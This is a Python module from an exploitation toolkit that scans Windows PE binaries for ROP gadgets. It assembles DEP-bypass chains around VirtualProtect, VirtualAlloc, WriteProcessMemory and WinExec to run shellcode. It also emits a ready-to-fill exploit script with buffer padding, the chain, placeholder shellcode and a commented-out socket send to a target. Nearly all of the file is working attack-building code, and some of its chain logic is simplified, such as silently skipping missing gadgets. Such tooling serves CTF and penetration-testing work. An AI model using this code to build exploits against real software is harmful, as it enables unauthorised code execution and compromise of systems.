"""
Windows-specific ROP chain building.

Provides ROP chains for Windows exploitation, including:
- VirtualProtect chains (make memory executable)
- VirtualAlloc chains (allocate executable memory)
- NtProtectVirtualMemory chains (syscall-based)
- WriteProcessMemory chains
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Tuple

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class MemoryProtection(Enum):
    """Windows memory protection constants."""
    PAGE_NOACCESS = 0x01
    PAGE_READONLY = 0x02
    PAGE_READWRITE = 0x04
    PAGE_WRITECOPY = 0x08
    PAGE_EXECUTE = 0x10
    PAGE_EXECUTE_READ = 0x20
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_EXECUTE_WRITECOPY = 0x80


class AllocationType(Enum):
    """Windows memory allocation types."""
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    MEM_RESET = 0x80000
    MEM_TOP_DOWN = 0x100000
    MEM_COMMIT_RESERVE = 0x3000


@dataclass
class WindowsGadget:
    """Windows ROP gadget."""
    address: int
    instructions: str
    module: str = ""
    sets_register: Optional[str] = None
    pops_count: int = 0


@dataclass
class VirtualProtectChain:
    """VirtualProtect ROP chain."""
    chain_bytes: bytes
    return_address: int
    lpAddress: int          # Address to protect
    dwSize: int             # Size
    flNewProtect: int       # New protection (PAGE_EXECUTE_READWRITE)
    lpflOldProtect: int     # Pointer for old protection
    shellcode_offset: int   # Offset to shellcode in payload


@dataclass
class VirtualAllocChain:
    """VirtualAlloc ROP chain."""
    chain_bytes: bytes
    return_address: int
    lpAddress: int          # Desired address (or 0)
    dwSize: int             # Size to allocate
    flAllocationType: int   # MEM_COMMIT | MEM_RESERVE
    flProtect: int          # PAGE_EXECUTE_READWRITE


@dataclass
class NtProtectChain:
    """NtProtectVirtualMemory syscall chain."""
    chain_bytes: bytes
    syscall_number: int
    process_handle: int     # -1 for current process
    base_address: int
    region_size: int
    new_protection: int


class WindowsROP:
    """
    Windows ROP chain builder.

    Example:
        pe = PEBinary("target.exe")
        rop = WindowsROP(pe)

        # Build VirtualProtect chain
        chain = rop.build_virtualprotect_chain(
            shellcode_addr=0x12345678,
            shellcode_size=0x1000
        )

        # Build VirtualAlloc chain
        chain = rop.build_virtualalloc_chain(
            size=0x1000
        )
    """

    # Common Windows API addresses (will need runtime resolution)
    KERNEL32_FUNCS = [
        "VirtualProtect",
        "VirtualAlloc",
        "VirtualFree",
        "WriteProcessMemory",
        "CreateThread",
        "WinExec",
        "LoadLibraryA",
        "GetProcAddress",
    ]

    NTDLL_FUNCS = [
        "NtProtectVirtualMemory",
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "RtlMoveMemory",
    ]

    def __init__(self, pe_binary: Any):
        """
        Initialize Windows ROP builder.

        Args:
            pe_binary: PEBinary instance
        """
        self.pe = pe_binary
        self.bits = pe_binary.bits
        self.pack_fmt = "<Q" if self.bits == 64 else "<I"
        self.word_size = 8 if self.bits == 64 else 4

        # Find useful addresses
        self._find_api_addresses()

        # Find gadgets
        self.gadgets: Dict[str, WindowsGadget] = {}
        self._find_essential_gadgets()

    def _find_api_addresses(self):
        """Find Windows API function addresses."""
        self.api_addresses: Dict[str, int] = {}

        for imp in self.pe.imports:
            if imp.name in self.KERNEL32_FUNCS or imp.name in self.NTDLL_FUNCS:
                self.api_addresses[imp.name] = imp.iat_address
                logger.debug(f"Found {imp.name} at IAT {hex(imp.iat_address)}")

    def _find_essential_gadgets(self):
        """Find essential ROP gadgets."""
        try:
            from capstone import Cs, CS_ARCH_X86, CS_MODE_32, CS_MODE_64

            mode = CS_MODE_64 if self.bits == 64 else CS_MODE_32
            md = Cs(CS_ARCH_X86, mode)

            # Registers to find pop gadgets for
            if self.bits == 64:
                registers = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'r8', 'r9']
            else:
                registers = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi']

            for section in self.pe.sections:
                if not section.executable:
                    continue

                data = self.pe.read_bytes(section.virtual_address, section.virtual_size)

                for i in range(len(data)):
                    if data[i] != 0xc3:  # ret
                        continue

                    # Look for patterns before ret
                    for start in range(max(0, i - 20), i):
                        chunk = data[start:i + 1]
                        insns = list(md.disasm(chunk, 0))

                        if not insns or insns[-1].mnemonic != 'ret':
                            continue

                        addr = self.pe.image_base + section.virtual_address + start
                        disasm = "; ".join(f"{ins.mnemonic} {ins.op_str}".strip() for ins in insns)

                        # Categorize gadget
                        for ins in insns:
                            if ins.mnemonic == 'pop':
                                reg = ins.op_str.lower()
                                key = f"pop_{reg}"
                                if key not in self.gadgets:
                                    self.gadgets[key] = WindowsGadget(
                                        address=addr,
                                        instructions=disasm,
                                        sets_register=reg,
                                        pops_count=1
                                    )

                            # Stack pivot
                            if ins.mnemonic == 'xchg' and 'esp' in ins.op_str.lower():
                                if 'xchg_esp' not in self.gadgets:
                                    self.gadgets['xchg_esp'] = WindowsGadget(
                                        address=addr,
                                        instructions=disasm
                                    )

                            # push esp; ret (useful pattern)
                            if ins.mnemonic == 'push' and ins.op_str.lower() == 'esp':
                                if 'push_esp' not in self.gadgets:
                                    self.gadgets['push_esp'] = WindowsGadget(
                                        address=addr,
                                        instructions=disasm
                                    )

        except ImportError:
            logger.warning("Capstone not available for gadget search")
        except Exception as e:
            logger.debug(f"Error finding gadgets: {e}")

        logger.info(f"Found {len(self.gadgets)} essential gadgets")

    def pack(self, value: int) -> bytes:
        """Pack value for architecture."""
        import struct
        return struct.pack(self.pack_fmt, value)

    def build_virtualprotect_chain(
        self,
        shellcode_addr: int,
        shellcode_size: int = 0x1000,
        virtualprotect_addr: Optional[int] = None
    ) -> Optional[VirtualProtectChain]:
        """
        Build VirtualProtect ROP chain.

        VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)

        Args:
            shellcode_addr: Address of shellcode to make executable
            shellcode_size: Size of region
            virtualprotect_addr: Address of VirtualProtect (or use IAT)

        Returns:
            VirtualProtectChain or None if not possible
        """
        # Get VirtualProtect address
        vp_addr = virtualprotect_addr or self.api_addresses.get("VirtualProtect")
        if not vp_addr:
            logger.warning("VirtualProtect not found in imports")
            return None

        chain = bytearray()

        if self.bits == 32:
            # 32-bit: arguments on stack
            # VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)

            # Return address (where to return after VirtualProtect)
            chain += self.pack(shellcode_addr)  # Return to shellcode

            # VirtualProtect address
            # We need to set up: VirtualProtect(shellcode, size, 0x40, &writable)

            # Simplified: assume we can place args on stack
            # Stack layout:
            # [VirtualProtect addr]
            # [return addr -> shellcode]
            # [lpAddress]
            # [dwSize]
            # [flNewProtect = 0x40]
            # [lpflOldProtect]

            chain = bytearray()
            chain += self.pack(vp_addr)                                    # VirtualProtect
            chain += self.pack(shellcode_addr)                             # Return to shellcode
            chain += self.pack(shellcode_addr)                             # lpAddress
            chain += self.pack(shellcode_size)                             # dwSize
            chain += self.pack(MemoryProtection.PAGE_EXECUTE_READWRITE.value)  # flNewProtect
            chain += self.pack(shellcode_addr + shellcode_size)            # lpflOldProtect (writable addr)

        else:
            # 64-bit: arguments in registers (rcx, rdx, r8, r9)
            # Need to set up registers before calling VirtualProtect

            # This requires pop gadgets
            if "pop_rcx" not in self.gadgets:
                logger.warning("Missing pop rcx gadget for 64-bit VirtualProtect")
                return None

            # rcx = lpAddress
            if "pop_rcx" in self.gadgets:
                chain += self.pack(self.gadgets["pop_rcx"].address)
                chain += self.pack(shellcode_addr)

            # rdx = dwSize
            if "pop_rdx" in self.gadgets:
                chain += self.pack(self.gadgets["pop_rdx"].address)
                chain += self.pack(shellcode_size)

            # r8 = flNewProtect
            if "pop_r8" in self.gadgets:
                chain += self.pack(self.gadgets["pop_r8"].address)
                chain += self.pack(MemoryProtection.PAGE_EXECUTE_READWRITE.value)

            # r9 = lpflOldProtect
            if "pop_r9" in self.gadgets:
                chain += self.pack(self.gadgets["pop_r9"].address)
                chain += self.pack(shellcode_addr + shellcode_size)

            # Shadow space for x64 calling convention
            chain += self.pack(0) * 4  # 32 bytes shadow space

            # Call VirtualProtect
            chain += self.pack(vp_addr)

            # Return to shellcode
            chain += self.pack(shellcode_addr)

        return VirtualProtectChain(
            chain_bytes=bytes(chain),
            return_address=shellcode_addr,
            lpAddress=shellcode_addr,
            dwSize=shellcode_size,
            flNewProtect=MemoryProtection.PAGE_EXECUTE_READWRITE.value,
            lpflOldProtect=shellcode_addr + shellcode_size,
            shellcode_offset=len(chain)
        )

    def build_virtualalloc_chain(
        self,
        size: int = 0x1000,
        preferred_addr: int = 0,
        virtualalloc_addr: Optional[int] = None
    ) -> Optional[VirtualAllocChain]:
        """
        Build VirtualAlloc ROP chain.

        VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)

        Args:
            size: Size to allocate
            preferred_addr: Preferred address (0 for any)
            virtualalloc_addr: Address of VirtualAlloc

        Returns:
            VirtualAllocChain or None
        """
        va_addr = virtualalloc_addr or self.api_addresses.get("VirtualAlloc")
        if not va_addr:
            logger.warning("VirtualAlloc not found in imports")
            return None

        chain = bytearray()

        alloc_type = AllocationType.MEM_COMMIT_RESERVE.value
        protect = MemoryProtection.PAGE_EXECUTE_READWRITE.value

        if self.bits == 32:
            # Return address placeholder (will be filled with allocated address)
            chain += self.pack(0x41414141)  # Placeholder

            chain += self.pack(va_addr)
            chain += self.pack(0x42424242)  # Return (will go to allocated memory)
            chain += self.pack(preferred_addr)  # lpAddress
            chain += self.pack(size)           # dwSize
            chain += self.pack(alloc_type)     # flAllocationType
            chain += self.pack(protect)        # flProtect

        else:
            # 64-bit setup similar to VirtualProtect
            if "pop_rcx" in self.gadgets:
                chain += self.pack(self.gadgets["pop_rcx"].address)
                chain += self.pack(preferred_addr)

            if "pop_rdx" in self.gadgets:
                chain += self.pack(self.gadgets["pop_rdx"].address)
                chain += self.pack(size)

            if "pop_r8" in self.gadgets:
                chain += self.pack(self.gadgets["pop_r8"].address)
                chain += self.pack(alloc_type)

            if "pop_r9" in self.gadgets:
                chain += self.pack(self.gadgets["pop_r9"].address)
                chain += self.pack(protect)

            chain += self.pack(0) * 4  # Shadow space
            chain += self.pack(va_addr)

        return VirtualAllocChain(
            chain_bytes=bytes(chain),
            return_address=0,
            lpAddress=preferred_addr,
            dwSize=size,
            flAllocationType=alloc_type,
            flProtect=protect
        )

    def build_writeprocessmemory_chain(
        self,
        dest_addr: int,
        src_addr: int,
        size: int
    ) -> Optional[bytes]:
        """
        Build WriteProcessMemory ROP chain.

        WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, *lpNumberOfBytesWritten)

        Useful for copying shellcode to executable memory.
        """
        wpm_addr = self.api_addresses.get("WriteProcessMemory")
        if not wpm_addr:
            logger.warning("WriteProcessMemory not found")
            return None

        chain = bytearray()

        if self.bits == 32:
            chain += self.pack(wpm_addr)
            chain += self.pack(dest_addr)       # Return to dest after write
            chain += self.pack(0xFFFFFFFF)      # hProcess = -1 (current process)
            chain += self.pack(dest_addr)       # lpBaseAddress
            chain += self.pack(src_addr)        # lpBuffer
            chain += self.pack(size)            # nSize
            chain += self.pack(dest_addr + size)  # lpNumberOfBytesWritten

        return bytes(chain)

    def build_winexec_chain(
        self,
        cmd_addr: int,
        show_window: int = 0
    ) -> Optional[bytes]:
        """
        Build WinExec ROP chain.

        WinExec(lpCmdLine, uCmdShow)

        Args:
            cmd_addr: Address of command string
            show_window: SW_HIDE=0, SW_SHOW=5

        Returns:
            Chain bytes
        """
        winexec_addr = self.api_addresses.get("WinExec")
        if not winexec_addr:
            logger.warning("WinExec not found")
            return None

        chain = bytearray()

        if self.bits == 32:
            chain += self.pack(winexec_addr)
            chain += self.pack(0x42424242)  # Return (doesn't matter for cmd exec)
            chain += self.pack(cmd_addr)    # lpCmdLine
            chain += self.pack(show_window) # uCmdShow

        else:
            if "pop_rcx" in self.gadgets:
                chain += self.pack(self.gadgets["pop_rcx"].address)
                chain += self.pack(cmd_addr)

            if "pop_rdx" in self.gadgets:
                chain += self.pack(self.gadgets["pop_rdx"].address)
                chain += self.pack(show_window)

            chain += self.pack(0) * 4  # Shadow space
            chain += self.pack(winexec_addr)

        return bytes(chain)

    def get_available_apis(self) -> Dict[str, int]:
        """Get available Windows API addresses."""
        return self.api_addresses.copy()

    def get_available_gadgets(self) -> Dict[str, WindowsGadget]:
        """Get available gadgets."""
        return self.gadgets.copy()

    def generate_exploit_template(self, chain_type: str = "virtualprotect") -> str:
        """Generate exploit template."""
        template = f'''#!/usr/bin/env python3
"""
Windows ROP Exploit Template
Generated by supwngo

Target: {self.pe.path.name}
Architecture: {self.bits}-bit
Chain Type: {chain_type}
"""

import struct
import socket

# Target
TARGET = "127.0.0.1"
PORT = 9999

# Gadgets found
GADGETS = {{
'''
        for name, gadget in self.gadgets.items():
            template += f'    "{name}": {hex(gadget.address)},  # {gadget.instructions}\n'

        template += f'''}}

# Windows API addresses (from IAT)
API_ADDRESSES = {{
'''
        for name, addr in self.api_addresses.items():
            template += f'    "{name}": {hex(addr)},\n'

        template += '''}}

def pack32(value):
    return struct.pack("<I", value)

def pack64(value):
    return struct.pack("<Q", value)

'''
        if self.bits == 32:
            template += 'pack = pack32\n'
        else:
            template += 'pack = pack64\n'

        template += '''

# Shellcode placeholder
SHELLCODE = b"\\xcc" * 100  # Replace with actual shellcode

def build_rop_chain():
    """Build ROP chain for DEP bypass."""
    chain = b""

    # TODO: Build chain based on available gadgets
    # Example VirtualProtect chain:
    # chain += pack(GADGETS["pop_ecx"])  # or pop_rcx for 64-bit
    # chain += pack(shellcode_addr)
    # ...

    return chain

def create_payload():
    """Create complete exploit payload."""
    payload = b""

    # Padding to return address
    payload += b"A" * 1024  # Adjust offset

    # ROP chain
    payload += build_rop_chain()

    # Shellcode
    payload += SHELLCODE

    return payload

def exploit():
    payload = create_payload()
    print(f"[*] Payload size: {len(payload)}")

    # Send to target
    # s = socket.socket()
    # s.connect((TARGET, PORT))
    # s.send(payload)
    # s.close()

if __name__ == "__main__":
    exploit()
'''
        return template

    def summary(self) -> str:
        """Get ROP builder summary."""
        lines = [
            "Windows ROP Analysis",
            "=" * 40,
            f"Binary: {self.pe.path.name}",
            f"Architecture: {self.bits}-bit",
            "",
            "Available APIs:",
        ]

        for name, addr in self.api_addresses.items():
            lines.append(f"  {name}: {hex(addr)}")

        lines.append("")
        lines.append("Available Gadgets:")

        for name, gadget in list(self.gadgets.items())[:10]:
            lines.append(f"  {name}: {hex(gadget.address)}")

        return "\n".join(lines)


def build_windows_rop(pe_binary: Any, chain_type: str = "virtualprotect") -> Optional[bytes]:
    """
    Convenience function to build Windows ROP chain.

    Args:
        pe_binary: PEBinary instance
        chain_type: Type of chain ("virtualprotect", "virtualalloc", "winexec")

    Returns:
        ROP chain bytes or None
    """
    rop = WindowsROP(pe_binary)

    if chain_type == "virtualprotect":
        # Need shellcode address - placeholder
        chain = rop.build_virtualprotect_chain(0x12345678)
        return chain.chain_bytes if chain else None

    elif chain_type == "virtualalloc":
        chain = rop.build_virtualalloc_chain()
        return chain.chain_bytes if chain else None

    elif chain_type == "winexec":
        return rop.build_winexec_chain(0x12345678)

    return None
